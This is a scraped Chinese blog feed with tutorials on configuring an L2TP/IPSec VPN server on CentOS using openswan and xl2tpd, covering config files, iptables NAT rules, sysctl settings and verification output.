<p><pre class="prettyprint linenums">[global]<br>listen-addr = $your_vps_ip #替换成你的vpsip<br>ipsec saref = yes<br>[lns default]<br>ip range = 192.168.30.10-192.168.30.20<br>local ip = 192.168.30.1<br>require chap = yes<br>refuse pap = yes<br>require authentication = yes<br>ppp debug = yes<br>pppoptfile = /etc/ppp/options.xl2tpd<br>length bit = yes<br></pre><br>编辑 /etc/ppp/options.xl2tpd</p>
<p><pre class="prettyprint linenums">require-mschap-v2<br>ipcp-accept-local<br>ipcp-accept-remote<br>ms-dns  8.8.8.8<br>ms-dns  8.8.4.4<br>asyncmap 0<br>noccp<br>auth<br>crtscts<br>hide-password<br>debug<br>modem<br>lock<br>proxyarp<br>name l2tpd<br>lcp-echo-interval 30<br>lcp-echo-failure 4<br></pre><br>配置用户和密码 /etc/ppp/chap-secrets</p>
<p><pre class="prettyprint linenums"># Secrets for authentication using CHAP</pre></p>
<h1 id="client-server-secret-IP-addresses"><a href="#client-server-secret-IP-addresses" class="headerlink" title="client        server  secret                  IP addresses"></a>client        server  secret                  IP addresses</h1><p>name         l2tpd   password                *<br><br>配置转发规则</p>
<p><pre class="prettyprint linenums">iptables -t nat -A POSTROUTING -s 192.168.30.0/24 -o eth0 -j MASQUERADE<br>iptables -t nat -A POSTROUTING -s 192.168.30.0/24 -j SNAT –to-source $your_vps_ip<br></pre><br>启动</p>
<p><pre class="prettyprint linenums">/etc/init.d/ipsec restart<br>/etc/init.d/xl2tp restart<br></pre><br>为了保证每次vps重启后都正常启动l2tp服务，我们还需做下面操作</p>
<p><pre class="prettyprint linenums">iptables-save &gt; /etc/iptables<br>echo “iptables-restore /etc/iptables” &gt;&gt; /etc/rc.local<br>echo “/usr/local/sbin/xl2tpd -D &amp;” &gt;&gt; /etc/rc.local<br>chkconfig –add ipsec<br>chkconfig –level 2345 ipsec on<br></pre><br>收工</p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[CentOS6下安装L2TP/IPSec VPN安装配置(推)]]></title>
      <url>http://www.linux52.com/2015-10-04-centos6-e4-b8-8b-e5-ae-89-e8-a3-85l2tpipsec-vpn-e5-ae-89-e8-a3-85-e9-85-8d-e7-bd-ae-e6-8e-a8.html</url>
      <content type="html"><![CDATA[<p>上次把VPS重新初始化后，一直没空重新部署VPN，ipad无法翻墙，真心的不爽。正好之前用的是PPTP，这次想要尝试下L2TP。<br>两者有什么区别呢？对比如下：</p>
<p>VPN数据传输协议：PPTP、L2TP<br>PPTP                                         L2TP<br>基于IP的互联网                       基于多种广域网络连接,介质入帧中继，IPX.25<br>没有报头压缩                         报头压缩<br>没有隧道身份验证                    隧道身份验证<br>采用PPP加密                         使用IPSec加密</p>
<h5 id="安装IPSec"><a href="#安装IPSec" class="headerlink" title="安装IPSec"></a>安装IPSec</h5><p>IPSec会对IP数据包进行加密和验证，这意味着你的电脑/移动设备与服务器之间传输的数据无法被解密、也不能被伪造。推荐使用openswan这个后台软件来跑IPSec。</p>
<p>wget <a href="http://download.openswan.org/openswan/old/openswan-2.6.38.tar.gz" target="_blank" rel="external">http://download.openswan.org/openswan/old/openswan-2.6.38.tar.gz</a><br>tar zxvf openswan-2.6.38.tar.gz<br>cd openswan-2.6.38<br>make programs install</p>
<p>经验教训：个别版本的openswan和xl2tpd配合使用，存在问题，会造成无法正常使用，绝对是血的教训，为了这个问题，折腾了一个下午，最后一尝试2.6.38就可以了。<br>截至2012-12-25，CentOS 6.3源里自带的openswan版本无法正常使用<br>修改/etc/ipsec.conf</p>
<p>添加以下内容：</p>
<p><div id="crayon-5610cfe20b361003259181" class="crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover"></div></p>
<p><div class="crayon-plain-wrap"></div></p>
<p><div class="crayon-main"></div></p>
<p><table class="crayon-table"></table></p>
<p><tbody></tbody></p>
<p><tr class="crayon-row"></tr></p>
<p><td class="crayon-nums " data-settings="show"></td></p>
<p><div class="crayon-nums-content"></div></p>
<p><div class="crayon-num" data-line="crayon-5610cfe20b361003259181-1">1</div></p>
<p><div class="crayon-num crayon-striped-num" data-line="crayon-5610cfe20b361003259181-2">2</div></p>
<p><div class="crayon-num" data-line="crayon-5610cfe20b361003259181-3">3</div></p>
<p><div class="crayon-num crayon-striped-num" data-line="crayon-5610cfe20b361003259181-4">4</div></p>
<p><div class="crayon-num" data-line="crayon-5610cfe20b361003259181-5">5</div></p>
<p><div class="crayon-num crayon-striped-num" data-line="crayon-5610cfe20b361003259181-6">6</div></p>
<p><div class="crayon-num" data-line="crayon-5610cfe20b361003259181-7">7</div></p>
<p><div class="crayon-num crayon-striped-num" data-line="crayon-5610cfe20b361003259181-8">8</div></p>
<p><div class="crayon-num" data-line="crayon-5610cfe20b361003259181-9">9</div></p>
<p><div class="crayon-num crayon-striped-num" data-line="crayon-5610cfe20b361003259181-10">10</div></p>
<p><div class="crayon-num" data-line="crayon-5610cfe20b361003259181-11">11</div></p>
<p><div class="crayon-num crayon-striped-num" data-line="crayon-5610cfe20b361003259181-12">12</div></p>
<p><div class="crayon-num" data-line="crayon-5610cfe20b361003259181-13">13</div></p>
<p><div class="crayon-num crayon-striped-num" data-line="crayon-5610cfe20b361003259181-14">14</div></p>
<p><div class="crayon-num" data-line="crayon-5610cfe20b361003259181-15">15</div></p>
<p><div class="crayon-num crayon-striped-num" data-line="crayon-5610cfe20b361003259181-16">16</div></p>
<p><div class="crayon-num" data-line="crayon-5610cfe20b361003259181-17">17</div></p>
<p><div class="crayon-num crayon-striped-num" data-line="crayon-5610cfe20b361003259181-18">18</div></p>
<p><div class="crayon-num" data-line="crayon-5610cfe20b361003259181-19">19</div></p>
<p><div class="crayon-num crayon-striped-num" data-line="crayon-5610cfe20b361003259181-20">20</div></p>
<p><div class="crayon-num" data-line="crayon-5610cfe20b361003259181-21">21</div></p>
<p><div class="crayon-num crayon-striped-num" data-line="crayon-5610cfe20b361003259181-22">22</div></p>
<p><div class="crayon-num" data-line="crayon-5610cfe20b361003259181-23">23</div></p>
<p><div class="crayon-num crayon-striped-num" data-line="crayon-5610cfe20b361003259181-24">24</div></p>
<p><div class="crayon-num" data-line="crayon-5610cfe20b361003259181-25">25</div></p>
<p><div class="crayon-num crayon-striped-num" data-line="crayon-5610cfe20b361003259181-26">26</div></p>
<p><div class="crayon-num" data-line="crayon-5610cfe20b361003259181-27">27</div></p>
<p><div class="crayon-num crayon-striped-num" data-line="crayon-5610cfe20b361003259181-28">28</div></p>
<p><div class="crayon-num" data-line="crayon-5610cfe20b361003259181-29">29</div></p>
<p><div class="crayon-num crayon-striped-num" data-line="crayon-5610cfe20b361003259181-30">30</div></p>
<p><div class="crayon-num" data-line="crayon-5610cfe20b361003259181-31">31</div></p>
<p><div class="crayon-num crayon-striped-num" data-line="crayon-5610cfe20b361003259181-32">32</div></p>
<p><div class="crayon-num" data-line="crayon-5610cfe20b361003259181-33">33</div></p>
<p><div class="crayon-num crayon-striped-num" data-line="crayon-5610cfe20b361003259181-34">34</div></p>
<p><div class="crayon-num" data-line="crayon-5610cfe20b361003259181-35">35</div></p>
<p><div class="crayon-num crayon-striped-num" data-line="crayon-5610cfe20b361003259181-36">36</div></p>
<p><div class="crayon-num" data-line="crayon-5610cfe20b361003259181-37">37</div></p>
<p><div class="crayon-num crayon-striped-num" data-line="crayon-5610cfe20b361003259181-38">38</div></p>
<p><div class="crayon-num" data-line="crayon-5610cfe20b361003259181-39">39</div></p>
<p><div class="crayon-num crayon-striped-num" data-line="crayon-5610cfe20b361003259181-40">40</div></p>
<p><div class="crayon-num" data-line="crayon-5610cfe20b361003259181-41">41</div></p>
<p><div class="crayon-num crayon-striped-num" data-line="crayon-5610cfe20b361003259181-42">42</div></p>
<p><div class="crayon-num" data-line="crayon-5610cfe20b361003259181-43">43</div></p>
<p><div class="crayon-num crayon-striped-num" data-line="crayon-5610cfe20b361003259181-44">44</div></p>
<p><div class="crayon-num" data-line="crayon-5610cfe20b361003259181-45">45</div></p>
<p><div class="crayon-num crayon-striped-num" data-line="crayon-5610cfe20b361003259181-46">46</div></p>
<p><div class="crayon-num" data-line="crayon-5610cfe20b361003259181-47">47</div></p>
<p><div class="crayon-num crayon-striped-num" data-line="crayon-5610cfe20b361003259181-48">48</div></p>
<p><div class="crayon-num" data-line="crayon-5610cfe20b361003259181-49">49</div></p>
<p><div class="crayon-num crayon-striped-num" data-line="crayon-5610cfe20b361003259181-50">50</div></p>
<p><div class="crayon-num" data-line="crayon-5610cfe20b361003259181-51">51</div></p>
<p><div class="crayon-num crayon-striped-num" data-line="crayon-5610cfe20b361003259181-52">52</div></p>
<p><div class="crayon-num" data-line="crayon-5610cfe20b361003259181-53">53</div></p>
<p><div class="crayon-num crayon-striped-num" data-line="crayon-5610cfe20b361003259181-54">54</div></p>
<p><div class="crayon-num" data-line="crayon-5610cfe20b361003259181-55">55</div></p>
<p><div class="crayon-num crayon-striped-num" data-line="crayon-5610cfe20b361003259181-56">56</div></p>
<p><div class="crayon-num" data-line="crayon-5610cfe20b361003259181-57">57</div></p>
<p><div class="crayon-num crayon-striped-num" data-line="crayon-5610cfe20b361003259181-58">58</div></p>
<p><div class="crayon-num" data-line="crayon-5610cfe20b361003259181-59">59</div></p>
<p><div class="crayon-num crayon-striped-num" data-line="crayon-5610cfe20b361003259181-60">60</div></p>
<p><div class="crayon-num" data-line="crayon-5610cfe20b361003259181-61">61</div></p>
<p><div class="crayon-num crayon-striped-num" data-line="crayon-5610cfe20b361003259181-62">62</div></p>
<p><div class="crayon-num" data-line="crayon-5610cfe20b361003259181-63">63</div><br></p>
<p><td class="crayon-code"></td></p>
<p><div class="crayon-pre"></div></p>
<p><div id="crayon-5610cfe20b361003259181-1" class="crayon-line"><span class="crayon-v">vi</span> <span class="crayon-o">/</span><span class="crayon-v">etc</span><span class="crayon-o">/</span><span class="crayon-v">ipsec</span><span class="crayon-sy">.</span><span class="crayon-v">conf</span></div></p>
<p><div id="crayon-5610cfe20b361003259181-2" class="crayon-line crayon-striped-line"></div></p>
<p><div id="crayon-5610cfe20b361003259181-3" class="crayon-line"><span class="crayon-p"># /etc/ipsec.conf - Openswan IPsec configuration file</span></div></p>
<p><div id="crayon-5610cfe20b361003259181-4" class="crayon-line crayon-striped-line"><span class="crayon-p"># RCSID $Id: ipsec.conf.in,v 1.16 2005/07/26 12:29:45 ken Exp $</span></div></p>
<p><div id="crayon-5610cfe20b361003259181-5" class="crayon-line"><span class="crayon-p"># This file:  /usr/local/share/doc/openswan/ipsec.conf-sample</span></div></p>
<p><div id="crayon-5610cfe20b361003259181-6" class="crayon-line crayon-striped-line"><span class="crayon-p">#</span></div></p>
<p><div id="crayon-5610cfe20b361003259181-7" class="crayon-line"><span class="crayon-p"># Manual:     ipsec.conf.5</span></div></p>
<p><div id="crayon-5610cfe20b361003259181-8" class="crayon-line crayon-striped-line"><span class="crayon-i">version</span> <span class="crayon-cn">2.0</span><span class="crayon-h">     </span><span class="crayon-p"># conforms to second version of ipsec.conf specification</span></div></p>
<p><div id="crayon-5610cfe20b361003259181-9" class="crayon-line"><span class="crayon-p"># basic configuration</span></div></p>
<p><div id="crayon-5610cfe20b361003259181-10" class="crayon-line crayon-striped-line"><span class="crayon-e">config </span><span class="crayon-v">setup</span></div></p>
<p><div id="crayon-5610cfe20b361003259181-11" class="crayon-line"><span class="crayon-h">        </span><span class="crayon-p"># Do not set debug options to debug configuration issues!</span></div></p>
<p><div id="crayon-5610cfe20b361003259181-12" class="crayon-line crayon-striped-line"><span class="crayon-h">        </span><span class="crayon-p"># plutodebug / klipsdebug = “all”, “none” or a combation from below:</span></div></p>
<p><div id="crayon-5610cfe20b361003259181-13" class="crayon-line"><span class="crayon-h">        </span><span class="crayon-p"># “raw crypt parsing emitting control klips pfkey natt x509 dpd private”</span></div></p>
<p><div id="crayon-5610cfe20b361003259181-14" class="crayon-line crayon-striped-line"><span class="crayon-h">        </span><span class="crayon-p"># eg:</span></div></p>
<p><div id="crayon-5610cfe20b361003259181-15" class="crayon-line"><span class="crayon-h">        </span><span class="crayon-p"># plutodebug=”control parsing”</span></div></p>
<p><div id="crayon-5610cfe20b361003259181-16" class="crayon-line crayon-striped-line"><span class="crayon-h">        </span><span class="crayon-p">#</span></div></p>
<p><div id="crayon-5610cfe20b361003259181-17" class="crayon-line"><span class="crayon-h">        </span><span class="crayon-p"># enable to get logs per-peer</span></div></p>
<p><div id="crayon-5610cfe20b361003259181-18" class="crayon-line crayon-striped-line"><span class="crayon-h">        </span><span class="crayon-p"># plutoopts=”–perpeerlog”</span></div></p>
<p><div id="crayon-5610cfe20b361003259181-19" class="crayon-line"><span class="crayon-h">        </span><span class="crayon-p">#</span></div></p>
<p><div id="crayon-5610cfe20b361003259181-20" class="crayon-line crayon-striped-line"><span class="crayon-h">        </span><span class="crayon-p"># Again: only enable plutodebug or klipsdebug when asked by a developer</span></div></p>
<p><div id="crayon-5610cfe20b361003259181-21" class="crayon-line"><span class="crayon-h">        </span><span class="crayon-p">#</span></div></p>
<p><div id="crayon-5610cfe20b361003259181-22" class="crayon-line crayon-striped-line"><span class="crayon-h">        </span><span class="crayon-p"># NAT-TRAVERSAL support, see README.NAT-Traversal</span></div></p>
<p><div id="crayon-5610cfe20b361003259181-23" class="crayon-line"><span class="crayon-h">        </span><span class="crayon-v">nat_traversal</span><span class="crayon-o">=</span><span class="crayon-v">yes</span></div></p>
<p><div id="crayon-5610cfe20b361003259181-24" class="crayon-line crayon-striped-line"><span class="crayon-h">        </span><span class="crayon-p"># exclude networks used on server side by adding %v4:!a.b.c.0/24</span></div></p>
<p><div id="crayon-5610cfe20b361003259181-25" class="crayon-line"><span class="crayon-h">        </span><span class="crayon-v">virtual_private</span><span class="crayon-o">=</span><span class="crayon-o">%</span><span class="crayon-v">v4</span><span class="crayon-o">:</span><span class="crayon-cn">10.0.0.0</span><span class="crayon-o">/</span><span class="crayon-cn">8</span><span class="crayon-sy">,</span><span class="crayon-o">%</span><span class="crayon-v">v4</span><span class="crayon-o">:</span><span class="crayon-cn">192.168.0.0</span><span class="crayon-o">/</span><span class="crayon-cn">16</span><span class="crayon-sy">,</span><span class="crayon-o">%</span><span class="crayon-v">v4</span><span class="crayon-o">:</span><span class="crayon-cn">172.16.0.0</span><span class="crayon-o">/</span><span class="crayon-cn">12</span></div></p>
<p><div id="crayon-5610cfe20b361003259181-26" class="crayon-line crayon-striped-line"><span class="crayon-h">        </span><span class="crayon-p"># OE is now off by default. Uncomment and change to on, to enable.</span></div></p>
<p><div id="crayon-5610cfe20b361003259181-27" class="crayon-line"><span class="crayon-h">        </span><span class="crayon-v">oe</span><span class="crayon-o">=</span><span class="crayon-v">off</span></div></p>
<p><div id="crayon-5610cfe20b361003259181-28" class="crayon-line crayon-striped-line"><span class="crayon-h">        </span><span class="crayon-p"># which IPsec stack to use. netkey,klips,mast,auto or none</span></div></p>
<p><div id="crayon-5610cfe20b361003259181-29" class="crayon-line"><span class="crayon-h">        </span><span class="crayon-v">protostack</span><span class="crayon-o">=</span><span class="crayon-v">netkey</span></div></p>
<p><div id="crayon-5610cfe20b361003259181-30" class="crayon-line crayon-striped-line"></div></p>
<p><div id="crayon-5610cfe20b361003259181-31" class="crayon-line"><span class="crayon-p"># Add connections here</span></div></p>
<p><div id="crayon-5610cfe20b361003259181-32" class="crayon-line crayon-striped-line"></div></p>
<p><div id="crayon-5610cfe20b361003259181-33" class="crayon-line"><span class="crayon-p"># sample VPN connection</span></div></p>
<p><div id="crayon-5610cfe20b361003259181-34" class="crayon-line crayon-striped-line"><span class="crayon-p"># for more examples, see /etc/ipsec.d/examples/</span></div></p>
<p><div id="crayon-5610cfe20b361003259181-35" class="crayon-line"><span class="crayon-p">#conn sample</span></div></p>
<p><div id="crayon-5610cfe20b361003259181-36" class="crayon-line crayon-striped-line"><span class="crayon-p">#               # Left security gateway, subnet behind it, nexthop toward right.</span></div></p>
<p><div id="crayon-5610cfe20b361003259181-37" class="crayon-line"><span class="crayon-p">#               left=10.0.0.1</span></div></p>
<p><div id="crayon-5610cfe20b361003259181-38" class="crayon-line crayon-striped-line"><span class="crayon-p">#               leftsubnet=172.16.0.0/24</span></div></p>
<p><div id="crayon-5610cfe20b361003259181-39" class="crayon-line"><span class="crayon-p">#               leftnexthop=10.22.33.44</span></div></p>
<p><div id="crayon-5610cfe20b361003259181-40" class="crayon-line crayon-striped-line"><span class="crayon-p">#               # Right security gateway, subnet behind it, nexthop toward left.</span></div></p>
<p><div id="crayon-5610cfe20b361003259181-41" class="crayon-line"><span class="crayon-p">#               right=10.12.12.1</span></div></p>
<p><div id="crayon-5610cfe20b361003259181-42" class="crayon-line crayon-striped-line"><span class="crayon-p">#               rightsubnet=192.168.0.0/24</span></div></p>
<p><div id="crayon-5610cfe20b361003259181-43" class="crayon-line"><span class="crayon-p">#               rightnexthop=10.101.102.103</span></div></p>
<p><div id="crayon-5610cfe20b361003259181-44" class="crayon-line crayon-striped-line"><span class="crayon-p">#               # To authorize this connection, but not actually start it,</span></div></p>
<p><div id="crayon-5610cfe20b361003259181-45" class="crayon-line"><span class="crayon-p">#               # at startup, uncomment this.</span></div></p>
<p><div id="crayon-5610cfe20b361003259181-46" class="crayon-line crayon-striped-line"><span class="crayon-p">#               #auto=start</span></div></p>
<p><div id="crayon-5610cfe20b361003259181-47" class="crayon-line"></div></p>
<p><div id="crayon-5610cfe20b361003259181-48" class="crayon-line crayon-striped-line"><span class="crayon-e">conn </span><span class="crayon-v">L2TP</span><span class="crayon-o">-</span><span class="crayon-v">PSK</span><span class="crayon-o">-</span><span class="crayon-e">NAT</span></div></p>
<p><div id="crayon-5610cfe20b361003259181-49" class="crayon-line"><span class="crayon-e">    </span><span class="crayon-v">rightsubnet</span><span class="crayon-o">=</span><span class="crayon-v">vhost</span><span class="crayon-o">:</span><span class="crayon-o">%</span><span class="crayon-e">priv</span></div></p>
<p><div id="crayon-5610cfe20b361003259181-50" class="crayon-line crayon-striped-line"><span class="crayon-e">    </span><span class="crayon-v">also</span><span class="crayon-o">=</span><span class="crayon-v">L2TP</span><span class="crayon-o">-</span><span class="crayon-v">PSK</span><span class="crayon-o">-</span><span class="crayon-e">noNAT</span></div></p>
<p><div id="crayon-5610cfe20b361003259181-51" class="crayon-line"></div></p>
<p><div id="crayon-5610cfe20b361003259181-52" class="crayon-line crayon-striped-line"><span class="crayon-e">conn </span><span class="crayon-v">L2TP</span><span class="crayon-o">-</span><span class="crayon-v">PSK</span><span class="crayon-o">-</span><span class="crayon-e">noNAT</span></div></p>
<p><div id="crayon-5610cfe20b361003259181-53" class="crayon-line"><span class="crayon-e">    </span><span class="crayon-v">authby</span><span class="crayon-o">=</span><span class="crayon-e">secret</span></div></p>
<p><div id="crayon-5610cfe20b361003259181-54" class="crayon-line crayon-striped-line"><span class="crayon-e">    </span><span class="crayon-v">pfs</span><span class="crayon-o">=</span><span class="crayon-e">no</span></div></p>
<p><div id="crayon-5610cfe20b361003259181-55" class="crayon-line"><span class="crayon-e">    </span><span class="crayon-v">auto</span><span class="crayon-o">=</span><span class="crayon-e">add</span></div></p>
<p><div id="crayon-5610cfe20b361003259181-56" class="crayon-line crayon-striped-line"><span class="crayon-e">    </span><span class="crayon-v">keyingtries</span><span class="crayon-o">=</span><span class="crayon-cn">3</span></div></p>
<p><div id="crayon-5610cfe20b361003259181-57" class="crayon-line"><span class="crayon-h">    </span><span class="crayon-v">rekey</span><span class="crayon-o">=</span><span class="crayon-e">no</span></div></p>
<p><div id="crayon-5610cfe20b361003259181-58" class="crayon-line crayon-striped-line"><span class="crayon-e">    </span><span class="crayon-v">ikelifetime</span><span class="crayon-o">=</span><span class="crayon-cn">8h</span></div></p>
<p><div id="crayon-5610cfe20b361003259181-59" class="crayon-line"><span class="crayon-h">    </span><span class="crayon-v">keylife</span><span class="crayon-o">=</span><span class="crayon-cn">1h</span></div></p>
<p><div id="crayon-5610cfe20b361003259181-60" class="crayon-line crayon-striped-line"><span class="crayon-h">    </span><span class="crayon-v">type</span><span class="crayon-o">=</span><span class="crayon-e">transport</span></div></p>
<p><div id="crayon-5610cfe20b361003259181-61" class="crayon-line"><span class="crayon-e">    </span><span class="crayon-v">left</span><span class="crayon-o">=</span><span class="crayon-cn">106.187.35.56</span></div></p>
<p><div id="crayon-5610cfe20b361003259181-62" class="crayon-line crayon-striped-line"><span class="crayon-h">    </span><span class="crayon-v">leftprotoport</span><span class="crayon-o">=</span><span class="crayon-cn">17</span><span class="crayon-o">/</span><span class="crayon-cn">1701</span></div></p>
<p><div id="crayon-5610cfe20b361003259181-63" class="crayon-line"><span class="crayon-h">    </span><span class="crayon-v">right</span><span class="crayon-o">=</span><span class="crayon-o">%</span><span class="crayon-v">any</span></div><br><br><br><br><br><br></p>
<h1 id="vi-etc-ipsec-secrets"><a href="#vi-etc-ipsec-secrets" class="headerlink" title="vi /etc/ipsec.secrets"></a>vi /etc/ipsec.secrets</h1><p>改成：106.187.35.56 %any: PSK “hello”<br>106.187.35.56这部分换成你的服务器IP地址，hello随便换成一个字符串，比如你喜欢的任何一句话</p>
<p>修改包转发设置</p>
<p><div id="crayon-5610cfe20b373124502237" class="crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover"></div></p>
<p><div class="crayon-plain-wrap"></div></p>
<p><div class="crayon-main"></div></p>
<p><table class="crayon-table"></table></p>
<p><tbody></tbody></p>
<p><tr class="crayon-row"></tr></p>
<p><td class="crayon-nums " data-settings="show"></td></p>
<p><div class="crayon-nums-content"></div></p>
<p><div class="crayon-num" data-line="crayon-5610cfe20b373124502237-1">1</div></p>
<p><div class="crayon-num crayon-striped-num" data-line="crayon-5610cfe20b373124502237-2">2</div></p>
<p><div class="crayon-num" data-line="crayon-5610cfe20b373124502237-3">3</div></p>
<p><div class="crayon-num crayon-striped-num" data-line="crayon-5610cfe20b373124502237-4">4</div></p>
<p><div class="crayon-num" data-line="crayon-5610cfe20b373124502237-5">5</div><br></p>
<p><td class="crayon-code"></td></p>
<p><div class="crayon-pre"></div></p>
<p><div id="crayon-5610cfe20b373124502237-1" class="crayon-line"><span class="crayon-st">for</span> <span class="crayon-st">each</span> <span class="crayon-st">in</span> <span class="crayon-o">/</span><span class="crayon-v">proc</span><span class="crayon-o">/</span><span class="crayon-v">sys</span><span class="crayon-o">/</span><span class="crayon-v">net</span><span class="crayon-o">/</span><span class="crayon-v">ipv4</span><span class="crayon-o">/</span><span class="crayon-v">conf</span><span class="crayon-o">/</span><span class="crayon-o">*</span></div></p>
<p><div id="crayon-5610cfe20b373124502237-2" class="crayon-line crayon-striped-line"><span class="crayon-st">do</span></div></p>
<p><div id="crayon-5610cfe20b373124502237-3" class="crayon-line"><span class="crayon-i">echo</span> <span class="crayon-cn">0</span> <span class="crayon-o">&gt;</span> <span class="crayon-sy">$</span><span class="crayon-st">each</span><span class="crayon-o">/</span><span class="crayon-e">accept_redirects</span></div></p>
<p><div id="crayon-5610cfe20b373124502237-4" class="crayon-line crayon-striped-line"><span class="crayon-i">echo</span> <span class="crayon-cn">0</span> <span class="crayon-o">&gt;</span> <span class="crayon-sy">$</span><span class="crayon-st">each</span><span class="crayon-o">/</span><span class="crayon-e">send_redirects</span></div></p>
<p><div id="crayon-5610cfe20b373124502237-5" class="crayon-line"><span class="crayon-v">done</span></div><br><br><br><br><br><br><br>可能存在的问题：<br>Two or more interfaces found, checking IP forwarding [FAILED]<br>vi /etc/sysctl.conf<br>修改 net.ipv4.ip_forward = 1<br>net.ipv4.conf.default.rp_filter =0<br>sysctl -p</p>
<p>SAref kernel support [N/A]<br>这样的话， /etc/xl2tpd/xl2tpd.conf这个文件里<br>[global]<br>ipsec saref = no</p>
<p>重启ipsec，并测试运行效果<br>service ipsec restart<br>ipsec verify<br>如下即为正常工作：</p>
<p><div id="crayon-5610cfe20b37b717325811" class="crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover"></div></p>
<p><div class="crayon-plain-wrap"></div></p>
<p><div class="crayon-main"></div></p>
<p><table class="crayon-table"></table></p>
<p><tbody></tbody></p>
<p><tr class="crayon-row"></tr></p>
<p><td class="crayon-nums " data-settings="show"></td></p>
<p><div class="crayon-nums-content"></div></p>
<p><div class="crayon-num" data-line="crayon-5610cfe20b37b717325811-1">1</div></p>
<p><div class="crayon-num crayon-striped-num" data-line="crayon-5610cfe20b37b717325811-2">2</div></p>
<p><div class="crayon-num" data-line="crayon-5610cfe20b37b717325811-3">3</div></p>
<p><div class="crayon-num crayon-striped-num" data-line="crayon-5610cfe20b37b717325811-4">4</div></p>
<p><div class="crayon-num" data-line="crayon-5610cfe20b37b717325811-5">5</div></p>
<p><div class="crayon-num crayon-striped-num" data-line="crayon-5610cfe20b37b717325811-6">6</div></p>
<p><div class="crayon-num" data-line="crayon-5610cfe20b37b717325811-7">7</div></p>
<p><div class="crayon-num crayon-striped-num" data-line="crayon-5610cfe20b37b717325811-8">8</div></p>
<p><div class="crayon-num" data-line="crayon-5610cfe20b37b717325811-9">9</div></p>
<p><div class="crayon-num crayon-striped-num" data-line="crayon-5610cfe20b37b717325811-10">10</div></p>
<p><div class="crayon-num" data-line="crayon-5610cfe20b37b717325811-11">11</div></p>
<p><div class="crayon-num crayon-striped-num" data-line="crayon-5610cfe20b37b717325811-12">12</div></p>
<p><div class="crayon-num" data-line="crayon-5610cfe20b37b717325811-13">13</div></p>
<p><div class="crayon-num crayon-striped-num" data-line="crayon-5610cfe20b37b717325811-14">14</div></p>
<p><div class="crayon-num" data-line="crayon-5610cfe20b37b717325811-15">15</div></p>
<p><div class="crayon-num crayon-striped-num" data-line="crayon-5610cfe20b37b717325811-16">16</div></p>
<p><div class="crayon-num" data-line="crayon-5610cfe20b37b717325811-17">17</div><br></p>
<p><td class="crayon-code"></td></p>
<p><div class="crayon-pre"></div></p>
<p><div id="crayon-5610cfe20b37b717325811-1" class="crayon-line"><span class="crayon-p"># ipsec verify</span></div></p>
<p><div id="crayon-5610cfe20b37b717325811-2" class="crayon-line crayon-striped-line"><span class="crayon-e">Checking </span><span class="crayon-e">your </span><span class="crayon-e">system </span><span class="crayon-st">to</span> <span class="crayon-e">see </span><span class="crayon-st">if</span> <span class="crayon-e">IPsec </span><span class="crayon-e">got </span><span class="crayon-e">installed </span><span class="crayon-st">and</span> <span class="crayon-e">started </span><span class="crayon-v">correctly</span><span class="crayon-o">:</span></div></p>
<p><div id="crayon-5610cfe20b37b717325811-3" class="crayon-line"><span class="crayon-e">Version </span><span class="crayon-e">check </span><span class="crayon-st">and</span> <span class="crayon-e">ipsec </span><span class="crayon-v">on</span><span class="crayon-o">-</span><span class="crayon-i">path</span><span class="crayon-h">                                 </span><span class="crayon-sy">[</span><span class="crayon-v">OK</span><span class="crayon-sy">]</span></div></p>
<p><div id="crayon-5610cfe20b37b717325811-4" class="crayon-line crayon-striped-line"><span class="crayon-e">Linux </span><span class="crayon-e">Openswan </span><span class="crayon-v">U2</span><span class="crayon-sy">.</span><span class="crayon-cn">6.32</span><span class="crayon-o">/</span><span class="crayon-v">K3</span><span class="crayon-sy">.</span><span class="crayon-cn">6.5</span><span class="crayon-o">-</span><span class="crayon-e">linode47</span> <span class="crayon-sy">(</span><span class="crayon-v">netkey</span><span class="crayon-sy">)</span></div></p>
<p><div id="crayon-5610cfe20b37b717325811-5" class="crayon-line"><span class="crayon-e">Checking </span><span class="crayon-st">for</span> <span class="crayon-e">IPsec </span><span class="crayon-e">support </span><span class="crayon-st">in</span> <span class="crayon-i">kernel</span><span class="crayon-h">                            </span><span class="crayon-sy">[</span><span class="crayon-v">OK</span><span class="crayon-sy">]</span></div></p>
<p><div id="crayon-5610cfe20b37b717325811-6" class="crayon-line crayon-striped-line"><span class="crayon-e">SAref </span><span class="crayon-e">kernel </span><span class="crayon-i">support</span><span class="crayon-h">                                           </span><span class="crayon-sy">[</span><span class="crayon-v">N</span><span class="crayon-o">/</span><span class="crayon-v">A</span><span class="crayon-sy">]</span></div></p>
<p><div id="crayon-5610cfe20b37b717325811-7" class="crayon-line"><span class="crayon-v">NETKEY</span><span class="crayon-o">:</span><span class="crayon-h">  </span><span class="crayon-e">Testing </span><span class="crayon-st">for</span> <span class="crayon-e">disabled </span><span class="crayon-e">ICMP </span><span class="crayon-v">send</span><span class="crayon-sy">_</span>redirects<span class="crayon-h">              </span><span class="crayon-sy">[</span><span class="crayon-v">OK</span><span class="crayon-sy">]</span></div></p>
<p><div id="crayon-5610cfe20b37b717325811-8" class="crayon-line crayon-striped-line"><span class="crayon-e">NETKEY </span><span class="crayon-v">detected</span><span class="crayon-sy">,</span> <span class="crayon-e">testing </span><span class="crayon-st">for</span> <span class="crayon-e">disabled </span><span class="crayon-e">ICMP </span><span class="crayon-v">accept</span><span class="crayon-sy">_</span>redirects<span class="crayon-h">     </span><span class="crayon-sy">[</span><span class="crayon-v">OK</span><span class="crayon-sy">]</span></div></p>
<p><div id="crayon-5610cfe20b37b717325811-9" class="crayon-line"><span class="crayon-e">Checking </span><span class="crayon-e">that </span><span class="crayon-e">pluto </span><span class="crayon-st">is</span> <span class="crayon-i">running</span><span class="crayon-h">                                  </span><span class="crayon-sy">[</span><span class="crayon-v">OK</span><span class="crayon-sy">]</span></div></p>
<p><div id="crayon-5610cfe20b37b717325811-10" class="crayon-line crayon-striped-line"><span class="crayon-e">Pluto </span><span class="crayon-e">listening </span><span class="crayon-st">for</span> <span class="crayon-e">IKE </span><span class="crayon-e">on </span><span class="crayon-i">udp</span> <span class="crayon-cn">500</span><span class="crayon-h">                             </span><span class="crayon-sy">[</span><span class="crayon-v">OK</span><span class="crayon-sy">]</span></div></p>
